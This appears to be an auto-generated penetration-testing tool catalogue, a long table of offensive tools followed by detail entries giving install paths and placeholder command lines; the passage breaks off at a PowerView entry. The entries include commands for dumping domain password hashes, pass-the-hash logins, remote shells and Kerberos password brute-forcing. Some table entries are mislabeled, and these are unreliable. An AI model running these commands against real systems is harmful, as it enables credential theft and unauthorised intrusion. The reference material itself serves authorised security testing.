| netdiscover | Netdiscover | network-enum | scanner | linux | network-enum, arp, recon, lan, discovery | 2 |
| arp-scan | ARP Scan | network-enum | scanner | linux, macos | network-enum, arp, recon, lan, discovery | 2 |
| onesixtyone | onesixtyone | network-enum | cracker | linux | network-enum, snmp, brute-force, community-string | 2 |
| snmpwalk | snmpwalk | network-enum | client | linux | network-enum, snmp, enumeration, mib, walk | 2 |
| sshuttle | SSHuttle | lateral-movement | proxy | linux, macos | lateral-movement, pivoting, tunneling, ssh, vpn | 2 |
| eyewitness | EyeWitness | reporting | scanner | linux, windows | reporting, screenshots, web, documentation | 2 |
| aquatone | Aquatone | reporting | scanner | linux, macos, windows | reporting, screenshots, web, documentation | 2 |
| flameshot | Flameshot | reporting | tool | linux, windows | reporting, screenshots, documentation, annotations | 2 |
| nxc | NetExec (nxc) | active-directory | enumeration | linux, windows, macos | ad, smb, enumeration, crackmapexec, lateral-movement | 2 |
| rubeus | Rubeus | active-directory | exploitation | windows | ad, kerberos, rubeus, ghostpack, tickets | 2 |
| sharphound | SharpHound | active-directory | enumeration | windows | ad, bloodhound, enumeration, attack-paths | 2 |
| whisker | Whisker | active-directory | exploitation | windows, linux | ad, shadow-credentials, kerberos, persistence | 2 |
| coercer | Coercer | active-directory | exploitation | linux, windows | ad, coercion, ntlm-relay, petitpotam, printerbug | 2 |
| petitpotam | PetitPotam | active-directory | exploitation | linux, windows | ad, petitpotam, coercion, ntlm-relay, efsrpc | 2 |
| windapsearch | Windapsearch | active-directory | enumeration | linux, windows | ad, ldap, enumeration, go, windapsearch | 2 |
| adidnsdump | adidnsdump | active-directory | enumeration | linux, windows | ad, dns, enumeration, ldap | 2 |
| ldeep | ldeep | active-directory | enumeration | linux, windows | ad, ldap, enumeration, deep | 2 |
| certify | Certify | active-directory | enumeration | windows | ad, adcs, certificates, esc1, esc4, esc8 | 2 |
| bloodyad | BloodyAD | active-directory | exploitation | linux, windows | ad, acl-abuse, privilege-escalation, ldap | 2 |
| plumhound | PlumHound | active-directory | enumeration | linux | ad, bloodhound, reporting, attack-paths | 2 |
| ldaprelayscan | LdapRelayScan | active-directory | enumeration | linux, windows | ad, ldap, relay, ntlm-relay | 2 |
| krbrelayx | KrbRelayX | active-directory | exploitation | linux | ad, kerberos, relay, unconstrained-delegation | 2 |
| pre2k | Pre2K | active-directory | exploitation | linux, windows | ad, pre2k, computer-accounts, legacy | 2 |
| powermad | Powermad | active-directory | exploitation | windows | ad, rbcd, machine-accounts, powershell | 2 |
| seatbelt | Seatbelt | active-directory | enumeration | windows | ad, enumeration, windows, ghostpack,  situational-awareness | 2 |
| ldapnomnom | LdapNomNom | active-directory | enumeration | linux, windows | ad, ldap, enumeration, go, fast | 2 |
| sherlock | Sherlock | privilege-escalation | enumeration | windows | privesc, windows, powershell, vulnerability-scanner | 2 |
| privesccheck | PrivescCheck | privilege-escalation | enumeration | windows | privesc, windows, powershell, enumeration | 2 |
| beroot | BeRoot | privilege-escalation | enumeration | windows, linux | privesc, windows, linux, cross-platform, enumeration | 2 |
| windows-exploit-suggester | Windows Exploit Suggester | privilege-escalation | enumeration | windows, linux | privesc, windows, exploit-suggester, patches | 2 |
| juicy-potato | Juicy Potato | privilege-escalation | exploitation | windows | privesc, windows, potato, token-impersonation, seimpersonate | 2 |
| printspoofer | PrintSpoofer | privilege-escalation | exploitation | windows | privesc, windows, printspoofer, potato, seimpersonate | 2 |
| godpotato | GodPotato | privilege-escalation | exploitation | windows | privesc, windows, godpotato, potato, seimpersonate, dcom | 2 |
| commix | Commix | web | exploitation | linux, windows, macos | web, command-injection, rce, automation, exploitation | 2 |
| liffy | Liffy | web | exploitation | linux | web, lfi, rce, automation, file-inclusion | 2 |
| lfisuite | LFISuite | web | exploitation | linux, windows | web, lfi, path-traversal, automation, scanner | 2 |
| corsy | Corsy | web | scanner | linux, windows, macos | web, cors, misconfiguration, scanner, api | 2 |
| jwt_tool | JWT Tool | web | exploitation | linux, windows, macos | web, jwt, api, authentication, token | 2 |
| xsstrike | XSStrike | web | scanner | linux, windows, macos | web, xss, scanner, fuzzing | 2 |
| testssl-sh | testssl.sh | web | scanner | linux, windows, macos | web, tls, ssl, scanner, cryptography | 2 |
| paramspider | ParamSpider | web | enumerator | linux, windows, macos | web, parameter-discovery, recon, fuzzing | 2 |
| cmsmap | CMSmap | web | scanner | linux, windows | web, cms, wordpress, joomla, drupal, scanner | 2 |
| wpforce | WPForce | web | exploitation | linux, windows, macos | web, wordpress, bruteforce, backdoor, wpforce | 2 |
| ghidra | Ghidra | binary-exploitation | reverse-engineering | linux, windows, macos | binary, reverse-engineering, decompiler, ghidra, analysis | 2 |
| pwndbg | pwndbg | binary-exploitation | debugger | linux | binary, gdb, debugger, exploit-development, heap | 2 |
| angr | angr | binary-exploitation | analysis | linux, windows, macos | binary, symbolic-execution, automation, angr, analysis | 2 |
| ropgadget | ROPgadget | binary-exploitation | tool | linux, windows, macos | binary, rop, gadgets, exploit-development | 2 |
| patchelf | patchelf | binary-exploitation | tool | linux | binary, elf, libc, patching | 2 |
| libc-database | libc-database | binary-exploitation | tool | linux | binary, libc, database, exploit-development | 2 |
| gef | GEF (GDB Enhanced Features) | binary-exploitation | debugger | linux | binary, gdb, debugger, exploit-development, gef | 2 |
| pwninit | pwninit | binary-exploitation | tool | linux | binary, ctf, automation, setup | 2 |
| seccomp-tools | seccomp-tools | binary-exploitation | analysis | linux | binary, seccomp, sandbox, bypass | 2 |
| minicom | Minicom | iot-firmware | tool | linux | iot, uart, serial, debugging, terminal | 2 |
| picocom | Picocom | iot-firmware | tool | linux | iot, uart, serial, terminal, lightweight | 2 |
| boofuzz | Boofuzz | iot-firmware | fuzzer | linux, windows | iot, fuzzing, protocol, boofuzz, vulnerability-discovery | 2 |
| routersploit | RouterSploit | iot-firmware | exploitation | linux, windows | iot, routersploit, exploitation, embedded, framework | 2 |
| mqtt-explorer | MQTT Explorer | iot-firmware | tool | linux, windows, macos | iot, mqtt, protocol, broker, enumeration | 2 |
| mosquitto-clients | Mosquitto Clients | iot-firmware | tool | linux, windows, macos | iot, mqtt, protocol, cli, testing | 2 |
| rpivot | rpivot | lateral-movement | tunneling | linux, windows | pivoting, socks, reverse, firewall-bypass | 2 |
| foca | FOCA | recon | enumerator | windows, linux | recon, osint, metadata, documents, foca | 2 |
| metagoofil | Metagoofil | recon | enumerator | linux, windows | recon, osint, metadata, documents, google-dorks | 2 |
| ivre | IVRE | recon | framework | linux | recon, nmap, framework, vulnerability-correlation | 2 |
| medusa | Medusa | password-attacks | bruteforce | linux, windows | password, bruteforce, ssh, rdp, parallel | 2 |
| crunch | Crunch | password-attacks | generator | linux, windows | password, wordlist, generator, bruteforce | 2 |
| cewl | CeWL | password-attacks | generator | linux, windows | password, wordlist, generator, web, crawler | 2 |
| name-that-hash | Name That Hash | password-attacks | identifier | linux, windows | password, hash, identification, hashcat, john | 2 |
| sliver | Sliver | post-exploitation | c2 | linux, windows, macos | post-exploitation, c2, framework, sliver, implants | 2 |
| lazagne | LaZagne | post-exploitation | credential-harvest | windows, linux | post-exploitation, credentials, recovery, windows, lazagne | 2 |
| curl | Curl | recon | binary | linux | recon, binary | 2 |
| wget | Wget | recon | binary | linux | recon, binary | 2 |
| dig | Dig | recon | binary | linux | recon, binary | 2 |
| nslookup | Nslookup | recon | binary | linux, windows | recon, binary | 2 |
| file | File | binary-exploitation | binary | linux | binary-exploitation, binary | 2 |
| strings | Strings | binary-exploitation | binary | linux | binary-exploitation, binary | 2 |
| readelf | Readelf | binary-exploitation | binary | linux | binary-exploitation, binary | 2 |
| objdump | Objdump | binary-exploitation | binary | linux | binary-exploitation, binary | 2 |
| grep | Grep | recon | binary | linux | recon, binary | 2 |
| find | Find | privilege-escalation | binary | linux | privilege-escalation, binary | 2 |
| ls | Ls | network-enum | binary | linux | network-enum, binary | 2 |
| git | Git | recon | binary | linux | general, binary | 2 |
| python3 | Python3 | recon | interpreter | linux | general, interpreter | 2 |
| scp | Scp | lateral-movement | binary | linux | lateral-movement, binary | 2 |
| ssh | Ssh | lateral-movement | binary | linux | lateral-movement, binary | 2 |
| screen | Screen | post-exploitation | binary | linux | post-exploitation, binary | 2 |
| sudo | Sudo | privilege-escalation | binary | linux | privilege-escalation, binary | 2 |
| ip | Ip | network-enum | binary | linux | network-enum, binary | 2 |
| reg | Reg | privilege-escalation | binary | windows | privilege-escalation, binary | 2 |
| icacls | Icacls | privilege-escalation | binary | windows | privilege-escalation, binary | 2 |
| wmic | Wmic | privilege-escalation | binary | windows | privilege-escalation, binary | 2 |
| showmount | Showmount | network-enum | binary | linux | network-enum, binary | 2 |
| getcap | Getcap | privilege-escalation | binary | linux | privilege-escalation, binary | 2 |
| pwn | Pwn | binary-exploitation | script | linux | binary-exploitation, script | 2 |
| mitm6 | Mitm6 | active-directory | python | linux | active-directory, python | 2 |
| ntlmrelayx | Ntlmrelayx | active-directory | python | linux | active-directory, python | 2 |
| responder | Responder | active-directory | python | linux | active-directory, python | 2 |
| msfvenom | Msfvenom | exploitation-frameworks | ruby | linux | exploitation-frameworks, ruby | 2 |
| msfconsole | Msfconsole | exploitation-frameworks | ruby | linux | exploitation-frameworks, ruby | 2 |
| ROPgadget | ROPgadget | binary-exploitation | python | linux | binary-exploitation, python | 2 |
| accesschk | Accesschk | privilege-escalation | exe | windows | privilege-escalation, exe | 2 |
| cherrytree | Cherrytree | reporting | gui | linux | reporting, gui | 2 |
| pspy | Pspy | privilege-escalation | go | linux | privilege-escalation, go | 2 |
| whatweb | Whatweb | recon | ruby | linux | recon, ruby | 2 |
| git-dumper | Git Dumper | web | python | linux | web, python | 2 |
| lse | Lse | privilege-escalation | bash | linux | privilege-escalation, bash | 2 |
| shellter | Shellter | exploitation-frameworks | c | linux | exploitation-frameworks, c | 2 |
| jucypotato | Jucypotato | privilege-escalation | exe | windows | privilege-escalation, exe | 2 |
| watson | Watson | privilege-escalation | exe | windows | privilege-escalation, exe | 2 |
| linux-exploit-suggester | Linux Exploit Suggester | privilege-escalation | perl | linux | privilege-escalation, perl | 2 |
| openocd | Openocd | iot-firmware | binary | linux | iot-firmware, binary | 2 |
| flashrom | Flashrom | iot-firmware | c | linux | iot-firmware, c | 2 |
| gdb-multiarch | Gdb Multiarch | binary-exploitation | binary | linux | binary-exploitation, binary | 2 |
| gdb-peda | Gdb Peda | binary-exploitation | python | linux | binary-exploitation, python | 2 |
| qemu-mips-static | Qemu Mips Static | iot-firmware | binary | linux | iot-firmware, binary | 2 |
| jtagulator | Jtagulator | iot-firmware | hardware | hardware | iot-firmware, hardware | 2 |
| gpp-decrypt | Gpp Decrypt | active-directory | script | linux | active-directory, script | 2 |
| nishang | Nishang | post-exploitation | powershell | windows | post-exploitation, powershell | 2 |
| roguepotato | Roguepotato | privilege-escalation | exe | windows | privilege-escalation, exe | 2 |
| impacket-secretsdump | Impacket Secretsdump | active-directory | python | linux | active-directory, python | 2 |
| nasm | Nasm | binary-exploitation | binary | linux | binary-exploitation, binary | 2 |
| sqlite3 | Sqlite3 | iot-firmware | binary | linux | iot-firmware, binary | 2 |
| qemu-arm-static | Qemu Arm Static | iot-firmware | binary | linux | iot-firmware, binary | 2 |
| docker | Docker | recon | binary | linux | general, binary | 2 |
| gcc | Gcc | binary-exploitation | compiler | linux | binary-exploitation, compiler | 2 |
| arduino-cli | Arduino CLI | iot-firmware | cli | linux, windows, macos | iot, firmware, arduino, compile | 2 |
| tool:burpsuite | Burp Suite Professional | web |  | linux, windows, macos | proxy, scanner, intruder | 1 |
| tool:sqlmap | SQLMap | web |  | linux, macos | sqli, injection | 1 |
| tool:dalfox | Dalfox | web |  | linux, macos | xss | 1 |
| tool:nuclei | Nuclei | web |  | linux, macos, windows | scanner, cve | 1 |
| tool:dirb | DirBuster/DirB | web |  | linux, macos | bruteforce, fuzzing | 1 |
| tool:gobuster | Gobuster | web |  | linux, macos, windows | bruteforce, fuzzing | 1 |
| tool:wfuzz | Wfuzz | web |  | linux, macos | fuzzing, bruteforce | 1 |
| tool:ffuf | FFUF | web |  | linux, macos, windows | fuzzing, bruteforce | 1 |
| tool:commix | Commix | web |  | linux, macos | injection | 1 |
| tool:nikto | Nikto | web |  | linux, macos | scanner | 1 |
| tool:wpscan | WPScan | web |  | linux, macos | scanner, cms | 1 |
| tool:joomscan | Joomscan | web |  | linux, macos | scanner, cms | 1 |
| tool:whatweb | WhatWeb | web |  | linux, macos | fingerprint, recon | 1 |
| tool:wappalyzer | Wappalyzer | web |  | linux, macos, windows | fingerprint, recon | 1 |
| tool:maltego | Maltego | recon |  | linux, windows, macos | osint, graph | 1 |
| tool:theHarvester | theHarvester | recon |  | linux, macos | osint, recon | 1 |
| tool:recon-ng | Recon-ng | recon |  | linux, macos | osint, recon | 1 |
| tool:amass | Amass | recon |  | linux, macos, windows | osint, recon, subdomain | 1 |
| tool:subfinder | Subfinder | recon |  | linux, macos, windows | osint, recon, subdomain | 1 |
| tool:spiderfoot | SpiderFoot | recon |  | linux, macos, windows | osint, recon, scanner | 1 |
| tool:shodan | Shodan CLI | recon |  | linux, macos, windows | osint, iot, scanner | 1 |
| tool:photon | Photon | recon |  | linux, macos | osint, crawler, recon | 1 |
| tool:emailharvester | EmailHarvester | recon |  | linux, macos | osint, recon | 1 |
| tool:trufflehog | TruffleHog | recon |  | linux, macos, windows | secrets, scanner | 1 |
| tool:zraven | ZGrab2 | network-enum |  | linux, macos | scanner, banner | 1 |
| tool:tcpuller | TCPuller | network-enum |  | linux | network, banner | 1 |
| tool:httprobe | httprobe | network-enum |  | linux, macos | recon, network | 1 |
| tool:httpx | HTTPX | network-enum |  | linux, macos, windows | recon, http | 1 |
| tool:dnscan | dnscan | network-enum |  | linux, macos | dns, recon | 1 |
| tool:knockpy | knockpy | network-enum |  | linux, macos | dns, recon, subdomain | 1 |
| tool:virtual-host-discovery | Virtual Host Discovery | network-enum |  | linux, macos | vhost, recon | 1 |
| tool:volatility | Volatility 3 | ctf |  | linux, macos, windows | forensics, memory | 1 |
| tool:autopsy | Autopsy | ctf |  | linux, windows, macos | forensics | 1 |
| tool:sleuthkit | The Sleuth Kit | ctf |  | linux, macos, windows | forensics | 1 |
| tool:pdfid | PDFiD | ctf |  | linux, macos, windows | forensics, pdf | 1 |
| tool:strings | Strings | ctf |  | linux, macos | forensics, analyze | 1 |
| tool:exiftool | ExifTool | ctf |  | linux, macos, windows | forensics, metadata | 1 |
| tool:john | John the Ripper | password-attacks |  | linux, macos, windows | password, hash | 1 |
| tool:hashashcat | Hashcat | password-attacks |  | linux, windows, macos | password, hash, gpu | 1 |
| tool:hydra | Hydra | password-attacks |  | linux, macos, windows | password, bruteforce, auth | 1 |
| tool:medusa | Medusa | password-attacks |  | linux, macos | password, bruteforce, auth | 1 |
| tool:maskprocessor | MaskProcessor | password-attacks |  | linux, macos | password, rules | 1 |
| tool:cewl | CeWL | password-attacks |  | linux, macos | wordlist, recon | 1 |
| tool:metasploit | Metasploit Framework | exploitation-frameworks |  | linux, macos, windows | exploit, payload, framework | 1 |
| tool:empire | PowerShell Empire | exploitation-frameworks |  | linux, macos | exploit, post-exploitation | 1 |
| tool:powershell-empire | PowerShell Empire (Community) | exploitation-frameworks |  | linux, macos | c2, post-exploitation | 1 |
| tool:sliver | Sliver | exploitation-frameworks |  | linux, macos, windows | c2, payload, exploit | 1 |
| tool:ncat | Netcat (Ncat) | network-enum |  | linux, macos, windows | network, shell | 1 |
| tool:socat | Socat | network-enum |  | linux, macos | network, shell, relay | 1 |
| tool:revshellgen | RevShellGen | exploitation-frameworks |  | linux, macos | shell, payload | 1 |
| tool:revsocks | RevSOCKS | exploitation-frameworks |  | linux | proxy, tunnel | 1 |
| tool:proxychains | ProxyChains | network-enum |  | linux, macos | proxy, tunnel | 1 |
| tool:chisel | Chisel | network-enum |  | linux, macos, windows | tunnel, proxy | 1 |
| tool:cloudflared | Cloudflared Tunnel | network-enum |  | linux, macos, windows | tunnel, c2 | 1 |
| tool:ligolo | Ligolo | network-enum |  | linux, macos, windows | tunnel, proxy, socket | 1 |
| tool:reGeorg | reGeorg | exploitation-frameworks |  | linux, macos | pivot, proxy, tunnel | 1 |
| tool:sunssdshell | SunSSh Shell | exploitation-frameworks |  | linux, macos | shell, payload | 1 |
| tool:weevely | Weevely | exploitation-frameworks |  | linux, macos | webshell, shell, exploit | 1 |
| tool:rlone | RLOne (Rev Live One) | exploitation-frameworks |  | linux, macos | shell, exploit | 1 |
| tool:pspy | pspy | privilege-escalation |  | linux | priv-esc, monitor | 1 |
| tool:linpeas | LinPEAS | privilege-escalation |  | linux | priv-esc, enum | 1 |
| tool:winpeas | WinPEAS | privilege-escalation |  | windows | priv-esc, enum | 1 |
| tool:linenum | linenum.sh | privilege-escalation |  | linux | priv-esc, enum | 1 |
| tool:pwncat | pwncat | exploitation-frameworks |  | linux, macos | shell, priv-esc | 1 |
| tool:gtfoblookup | GTFOBins Lookup | privilege-escalation |  | linux, macos | priv-esc, suid, sudo | 1 |
| tool:ghidra | Ghidra | binary-exploitation |  | linux, macos, windows | reverse, disasm | 1 |
| tool:radare2 | Radare2 | binary-exploitation |  | linux, macos, windows | reverse, disasm | 1 |
| tool:IDA-pro | IDA Pro | binary-exploitation |  | linux, macos, windows | reverse, disasm | 1 |
| tool:frida | Frida | web |  | linux, macos, windows | mobile, hooking, debug | 1 |
| tool:apktool | APKTool | web |  | linux, macos, windows | mobile, reverse | 1 |
| tool:fricas | Jadx | web |  | linux, macos, windows | mobile, reverse | 1 |
| tool:cyberchef | CyberChef | ctf |  | linux, macos, windows | crypto, encode | 1 |
| tool:hash-identifier | hash-identifier | ctf |  | linux, macos | crypto, hash | 1 |
| tool:amsi-bypass | AMSI Bypass | defense-evasion | script | windows | defense-evasion, amsi, powershell | 1 |
| tool:invoke-obfuscation | Invoke-Obfuscation | defense-evasion | framework | windows | defense-evasion, obfuscation, powershell | 1 |
| tool:certify | Certify | defense-evasion | tool | windows | defense-evasion, adcs, certificates, windows | 1 |
| tool:runas | RunAs (NTLM Relay Bypass) | defense-evasion | exe | windows | defense-evasion, windows, auth | 1 |
| tool:lolbas | Living Off The Land Binaries | defense-evasion | reference | windows | defense-evasion, lolbins, living-off-the-land | 1 |
| tool:solidcore | McAfee Solidcore Bypass | defense-evasion | script | windows | defense-evasion, whitelisting, mcafee | 1 |
| tool:srum | SRUM Disk Usage | defense-evasion | tool | windows | defense-evasion, forensics, windows | 1 |

### Tool Details

#### nmap — Nmap
- Zone: recon | Category: recon | Type: scanner
- OS: linux, windows, macos
- Purpose: Network discovery and security auditing
- Tags: recon, scanning, network, ports, vulnerability
- Install (kali): sudo apt install -y nmap
- Path: /usr/bin/nmap
- Notes: Pre-installed on Kali
- Commands (3):
  - **Quick TCP scan of top 1000 ports**: `nmap -sV -sC -T4 TARGET_IP`
    - When: Initial host discovery and service identification
    - Output: Shows open ports, service versions, and default NSE scripts
  - **Full TCP port scan**: `nmap -p- -sV -sC -T4 TARGET_IP -oA nmap-full`
    - When: After initial scan shows filtered ports or when comprehensive coverage is needed
    - Output: All 65535 TCP ports scanned with service versions
  - **UDP scan (top 100)**: `nmap -sU --top-ports 100 TARGET_IP`
    - When: When TCP ports are filtered and UDP services might be exposed
    - Output: Open/filtered UDP ports
- Related Techniques: 15 — arp-discovery, dns-enumeration, passive-recon, pivoting, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying, tech:powerview
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, naabu

#### subfinder — Subfinder
- Zone: recon | Category: recon | Type: enumerator
- OS: linux, macos
- Purpose: Passive subdomain enumeration
- Tags: recon, subdomain, passive, dns, osint
- Install (kali): sudo apt install -y subfinder
- Path: /home/saad/go/bin/subfinder
- Notes: Pre-installed on Kali
- Commands (2):
  - **Enumerate subdomains silently**: `subfinder -d TARGET_DOMAIN -silent`
    - When: At the start of passive reconnaissance
    - Output: List of discovered subdomains
  - **Enumerate with all sources**: `subfinder -d TARGET_DOMAIN -all -o subdomains.txt`
    - When: When maximum coverage is needed
    - Output: Comprehensive subdomain list saved to file
- Related Techniques: 15 — delegation-enum, dns-enumeration, ipv6-mitm, kerberos-delegation-enum, passive-recon, smb-enumeration, snmp-enumeration, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, naabu

#### amass — Amass
- Zone: recon | Category: recon | Type: enumerator
- OS: linux, macos
- Purpose: In-depth attack surface mapping and subdomain enumeration
- Tags: recon, subdomain, dns, osint, attack-surface
- Install (kali): sudo apt install -y amass
- Path: /usr/bin/amass
- Notes: Pre-installed on Kali
- Commands (2):
  - **Passive subdomain enumeration**: `amass enum -passive -d TARGET_DOMAIN`
    - When: When passive reconnaissance is required
    - Output: Passive subdomain graph and list
  - **Active enumeration with DNS**: `amass enum -active -d TARGET_DOMAIN -o amass-results.txt`
    - When: When active DNS brute-forcing is allowed
    - Output: Active and passive subdomains with IPs
- Related Techniques: 15 — dcsync, delegation-enum, diamond-ticket, dns-enumeration, golden-ticket, heap-unsorted-bin-attack, ipv6-mitm, kerberos-delegation-enum, mqtt-attack, ntlm-relay
- Related Tools: 10 — curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, naabu, nmap

#### httpx — HTTPX
- Zone: recon | Category: recon | Type: scanner
- OS: linux, macos
- Purpose: Fast HTTP probing and web technology detection
- Tags: recon, web, http, probing, technology-detection
- Install (kali): sudo apt install -y httpx
- Path: /usr/bin/httpx
- Notes: Pre-installed on Kali
- Commands (2):
  - **Probe subdomains for web servers**: `cat subdomains.txt | httpx -silent -o live-hosts.txt`
    - When: After subdomain enumeration to find live web servers
    - Output: List of URLs with web servers responding
  - **Detect web technologies**: `httpx -u TARGET_URL -tech-detect -status-code -title`
    - When: When identifying technologies running on a web server
    - Output: URLs with detected technologies, status codes, and page titles
- Related Techniques: 15 — burp-workflow, cmdi-advanced, dns-enumeration, file-inclusion, lfi-advanced, passive-recon, sql-injection, ssrf, tech:broken-access-control, tech:csrf
- Related Tools: 10 — amass, curl, dig, foca, grep, ivre, masscan, metagoofil, naabu, nmap

#### naabu — Naabu
- Zone: recon | Category: recon | Type: scanner
- OS: linux, macos, windows
- Purpose: Fast port scanning with minimal false positives
- Tags: recon, ports, scanning, fast
- Install (kali): sudo apt install -y naabu
- Path: /usr/bin/naabu
- Notes: Pre-installed on Kali
- Commands (2):
  - **Quick port scan of target**: `naabu -host TARGET_IP -o naabu-ports.txt`
    - When: When rapid port discovery is needed across large ranges
    - Output: List of open ports
  - **Scan from file of hosts**: `naabu -list hosts.txt -top-ports 1000 -o naabu-results.txt`
    - When: When scanning multiple targets
    - Output: Open ports for each host
- Related Techniques: 15 — dns-enumeration, hashcat-attacks, ipv6-mitm, passive-recon, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying, tech:port-forwarding
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, nmap

#### masscan — Masscan
- Zone: recon | Category: recon | Type: scanner
- OS: linux, macos
- Purpose: Extremely fast Internet-scale port scanning
- Tags: recon, ports, scanning, fast, internet-scale
- Install (kali): sudo apt install -y masscan
- Path: /usr/bin/masscan
- Notes: Pre-installed on Kali
- Commands (2):
  - **Scan entire subnet for open ports**: `masscan TARGET_SUBNET -p0-65535 --rate=10000 -oL masscan-results.txt`
    - When: When you need to scan very large ranges quickly
    - Output: All open ports on the target subnet
  - **Full internet/range scan at high speed**: `masscan TARGET_CIDR -p1-65535 --rate=1000 --wait 2`
    - When: When you need extremely fast scanning of large ranges
    - Output: All open ports across the entire range
- Related Techniques: 15 — dns-enumeration, passive-recon, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying, tech:port-forwarding, tech:powerview, tech:ps-remoting
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, metagoofil, naabu, nmap

#### bloodhound — BloodHound
- Zone: active-directory | Category: active-directory | Type: analyzer
- OS: linux, windows
- Purpose: Active Directory attack path analysis
- Tags: active-directory, enumeration, graph, attack-paths, powershell
- Install (kali): sudo apt install -y bloodhound
- Path: /usr/bin/bloodhound
- Notes: Start neo4j first: sudo neo4j console
- Commands (2):
  - **Ingest data with SharpHound**: `SharpHound.exe -c All -d DOMAIN.LOCAL`
    - When: From a Windows domain-joined machine with domain user credentials
    - Output: JSON files with AD objects, sessions, and ACLs
  - **Start BloodHound GUI**: `bloodhound --no-sandbox`
    - When: After collecting data, to analyze attack paths
    - Output: GUI showing AD relationships and shortest paths to DA
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, certipy, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, ldapnomnom

#### impacket — Impacket
- Zone: active-directory | Category: active-directory | Type: framework
- OS: linux, windows
- Purpose: Network protocol implementation for Windows credentials and SMB
- Tags: active-directory, smb, credentials, python, rpc
- Install (kali): sudo apt install -y python3-impacket
- Path: /usr/bin/impacket-GetUserSPNs
- Notes: Or pip3 install impacket
- Commands (3):
  - **Dump SAM/SECURITY/SYSTEM via SMB**: `impacket-secretsdump DOMAIN/USER:PASSWORD@TARGET_IP -just-dc`
    - When: When you have domain credentials and want to extract hashes
    - Output: NTLM hashes of domain users
  - **PsExec-like remote execution**: `impacket-psexec DOMAIN/USER:PASSWORD@TARGET_IP cmd.exe`
    - When: When you need to execute commands remotely on Windows
    - Output: Remote shell on target
  - **Get NP users (AS-REP roasting)**: `impacket-GetNPUsers DOMAIN/ -dc-ip TARGET_IP -usersfile users.txt`
    - When: When enumerating users for AS-REP roasting
    - Output: TGTs for users without pre-auth required
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, always-install-elevated, arp-discovery
- Related Tools: 10 — bloodhound, certipy, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket-secretsdump, kerbrute, ldapsearch, mimikatz

#### crackmapexec — CrackMapExec
- Zone: active-directory | Category: active-directory | Type: framework
- OS: linux, windows
- Purpose: Swiss army knife for post-exploitation of Active Directory
- Tags: active-directory, post-exploitation, smb, winrm, enumeration
- Install (kali): sudo apt install -y crackmapexec
- Path: /usr/bin/crackmapexec
- Notes: Pre-installed on Kali; successor is NetExec (nxc)
- Commands (2):
  - **Enumerate SMB shares and logged on users**: `crackmapexec smb TARGET_IP -u 'USER' -p 'PASSWORD' --shares --users`
    - When: After obtaining valid credentials
    - Output: List of shares and users on target
  - **Pass-the-Hash with NTLM hash**: `crackmapexec smb TARGET_IP -u 'Administrator' -H NTLM_HASH --local-auth`
    - When: When you have an NTLM hash and want to authenticate
    - Output: Authentication results and access info
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, buffer-overflow
- Related Tools: 10 — adidnsdump, bloodhound, certipy, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, ldapnomnom

#### evil-winrm — Evil-WinRM
- Zone: active-directory | Category: active-directory | Type: shell
- OS: linux, macos
- Purpose: Remote shell access to Windows via WinRM
- Tags: active-directory, winrm, shell, remote, powershell
- Install (kali): sudo apt install -y evil-winrm
- Path: /usr/bin/evil-winrm
- Notes: Pre-installed on Kali
- Commands (2):
  - **Connect to WinRM with credentials**: `evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD`
    - When: When WinRM is open (5985/5986) and you have credentials
    - Output: WinRM shell with PowerShell access
  - **Connect with NTLM hash**: `evil-winrm -i TARGET_IP -u USERNAME -H NTLM_HASH`
    - When: Pass-the-Hash via WinRM
    - Output: WinRM shell without password
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, always-install-elevated, asrep-roasting
- Related Tools: 10 — bloodhound, certipy, crackmapexec, enum4linux, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, ldapsearch, mimikatz

#### kerbrute — Kerbrute
- Zone: active-directory | Category: active-directory | Type: cracker
- OS: linux, macos, windows
- Purpose: Kerberos username enumeration and brute forcing
- Tags: active-directory, kerberos, enumeration, brute-force, usernames
- Install (kali): sudo apt install -y kerbrute
- Path: /usr/local/bin/kerbrute
- Notes: Pre-installed on Kali
- Commands (2):
  - **Enumerate usernames**: `kerbrute userenum -d TARGET_DOMAIN --dc TARGET_IP userlist.txt`
    - When: When you need to find valid AD usernames
    - Output: Valid usernames that exist in the domain
  - **Brute force passwords**: `kerbrute bruteuser -d TARGET_DOMAIN --dc TARGET_IP passlist.txt USERNAME`
    - When: When you have a username and want to guess passwords
    - Output: Valid password if found
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodhound, certipy, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, krbrelayx

#### powerview — PowerView
